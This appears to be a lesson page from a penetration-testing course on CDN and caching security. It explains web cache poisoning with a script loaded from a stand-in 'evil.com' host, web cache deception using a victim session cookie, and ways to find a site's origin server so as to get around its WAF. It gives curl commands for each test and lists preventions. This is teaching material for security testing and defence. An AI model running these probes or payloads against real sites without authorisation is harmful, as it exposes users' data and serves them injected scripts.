# CDN and Caching

## Unit 2: Web Application Architecture — Topic 7

## 🎯 Overview

Content Delivery Networks (CDNs) and caching mechanisms are ubiquitous in modern web applications. While they improve performance, they introduce unique security considerations including cache poisoning, origin exposure, and web cache deception attacks. Penetration testers must understand these systems to identify and exploit caching-related vulnerabilities.

---

## 1. CDN Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    CDN ARCHITECTURE                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Users                    CDN Edge Nodes        Origin Server│
│  ┌───┐  ┌───┐           ┌──────────┐          ┌──────────┐ │
│  │US │──│EU │───────────→│  Edge    │─────────→│  Origin  │ │
│  └───┘  └───┘           │  Server  │  (cache  │  Server  │ │
│  ┌───┐                  │  (cached)│   miss)  │  (real)  │ │
│  │Asia│─────────────────→│          │←─────────│          │ │
│  └───┘                  └──────────┘  response└──────────┘ │
│                                                              │
│  Popular CDNs: Cloudflare, AWS CloudFront, Akamai,          │
│                Fastly, Azure CDN, Google Cloud CDN           │
│                                                              │
│  CDN provides:                                               │
│  • DDoS protection    • SSL termination                      │
│  • Content caching    • Geographic distribution              │
│  • WAF capabilities   • Load balancing                       │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Caching Mechanisms

### Cache Layers

```
Browser Cache → CDN Edge Cache → Reverse Proxy Cache → Application Cache → Database Cache
     │                │                  │                    │
  Cache-Control   Varnish/CDN        nginx/HAProxy        Redis/Memcached
  headers          rules              config               in-memory
```

### Cache-Control Headers

```http
# Response headers controlling caching
Cache-Control: public, max-age=3600          # Cacheable for 1 hour
Cache-Control: private, no-cache             # Not cached by CDN
Cache-Control: no-store                      # Never cached anywhere
Cache-Control: s-maxage=86400                # CDN-specific max age

# Vary header — determines cache key
Vary: Accept-Encoding, User-Agent, Cookie    # Different cache per these
```

---

## 3. Web Cache Poisoning

```
┌──────────────────────────────────────────────────────────────┐
│                  CACHE POISONING ATTACK                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Attacker sends request with malicious unkeyed header:    │
│                                                              │
│     GET /page HTTP/1.1                                       │
│     Host: target.com                                         │
│     X-Forwarded-Host: evil.com     ← Unkeyed input          │
│                                                              │
│  2. Server reflects X-Forwarded-Host in response:            │
│                                                              │
│     <script src="https://evil.com/xss.js"></script>          │
│                                                              │
│  3. CDN caches this poisoned response                        │
│                                                              │
│  4. ALL subsequent users receive the poisoned page!          │
│                                                              │
│     Victim: GET /page → cached poisoned response → XSS      │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Test for cache poisoning
# Step 1: Identify unkeyed headers
curl -s https://target.com/page \
  -H "X-Forwarded-Host: canary.evil.com" | grep canary

# Step 2: Check if response was cached
curl -s https://target.com/page -I | grep -i "x-cache"
# X-Cache: HIT = response came from cache

# Common unkeyed headers to test:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL
# X-Forwarded-Port, X-Rewrite-URL, X-Host
```

---

## 4. Web Cache Deception

```
┌──────────────────────────────────────────────────────────────┐
│                  CACHE DECEPTION ATTACK                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Attacker sends victim a crafted URL:                     │
│     https://target.com/account/profile/nonexistent.css       │
│                                                              │
│  2. Server ignores /nonexistent.css, serves /account/profile │
│     (dynamic, authenticated content with victim's data)      │
│                                                              │
│  3. CDN sees .css extension → caches the response!           │
│     Cache key: /account/profile/nonexistent.css              │
│                                                              │
│  4. Attacker requests same URL (unauthenticated):            │
│     GET /account/profile/nonexistent.css                     │
│     → Gets cached victim's profile data!                     │
│                                                              │
│  Condition: Path confusion between app and cache             │
│  App sees:   /account/profile (serves dynamic content)       │
│  Cache sees: *.css (caches as static content)                │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Test for cache deception
# Access authenticated page with static extension appended
curl https://target.com/account/settings/test.css \
  -H "Cookie: session=victim_session"
# Check if sensitive data is returned

# Then access without authentication
curl https://target.com/account/settings/test.css
# If same content returned → cache deception works!

# Extensions to test: .css, .js, .png, .jpg, .ico, .svg
```

---

## 5. CDN Bypass — Finding Origin Server

```
┌──────────────────────────────────────────────────────────────┐
│            FINDING THE ORIGIN SERVER                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Why bypass CDN?                                              │
│  • Access without WAF protection                             │
│  • Direct application testing                                │
│  • Bypass rate limiting                                      │
│  • Bypass geographic restrictions                            │
│                                                              │
│  Techniques:                                                 │
│  • DNS history (SecurityTrails, ViewDNS)                     │
│  • Subdomain enumeration (mail.target.com may be direct)     │
│  • SSL certificate search (Censys, crt.sh)                   │
│  • Email headers (Received: from origin-ip)                  │
│  • Shodan/Censys: search for same SSL cert on other IPs     │
│  • Outbound connections (SSRF reveals origin IP)             │
└──────────────────────────────────────────────────────────────┘
```

```bash
# DNS history lookup
# SecurityTrails, ViewDNS.info, DNS Dumpster

# Check for direct IP access
curl -H "Host: target.com" https://discovered-ip/

# Certificate transparency logs
curl "https://crt.sh/?q=target.com&output=json" | jq '.[].common_name'

# Email headers reveal origin
# Send email to target → check Received headers

# Shodan search for same certificate
# ssl.cert.subject.cn:"target.com"
```

---

## 6. Cache Key Testing

```bash
# Determine what parameters are part of the cache key
# Cache key typically: Host + Path + Query String

# Test 1: Are query parameters included?
curl https://target.com/page?cachebust=1 -I  # MISS
curl https://target.com/page?cachebust=1 -I  # HIT (same key)
curl https://target.com/page?cachebust=2 -I  # MISS (different key)

# Test 2: Are specific parameters excluded?
curl "https://target.com/page?utm_source=test" -I  # Same as /page?

# Test 3: Is the Cookie header part of cache key?
curl https://target.com/dashboard -H "Cookie: session=a" -I
curl https://target.com/dashboard -H "Cookie: session=b" -I
# If both HIT → sessions mixed (vulnerability!)

# Cache header indicators:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT (Cloudflare)
# Age: 3600 (seconds in cache)
# X-Cache-Hits: 5
```

---

## 📊 Summary Table

| Attack | Condition | Impact | Prevention |
|--------|-----------|--------|------------|
| Cache Poisoning | Unkeyed headers reflected | XSS on all users | Cache key includes all inputs |
| Cache Deception | Path confusion | Data theft | Don't cache by extension alone |
| Origin Bypass | Origin IP discovered | WAF bypass | Whitelist CDN IPs at origin |
| Cache Key Issues | Cookie not in key | Session mixing | Include auth in cache key |
| Stale Cache | Long max-age | Serve outdated/vuln content | Appropriate cache TTLs |

---

## ❓ Revision Questions

1. How does web cache poisoning differ from web cache deception?
2. What are unkeyed headers and why are they dangerous for caching?
3. How can you discover the origin server behind a CDN?
4. What cache headers indicate whether a response was served from cache?
5. Why is path confusion between the application and cache layer exploitable?
6. How do you test whether sensitive pages are incorrectly cached?

---

*Previous: [06-microservices.md](06-microservices.md)*

---

*[Back to README](../README.md)*
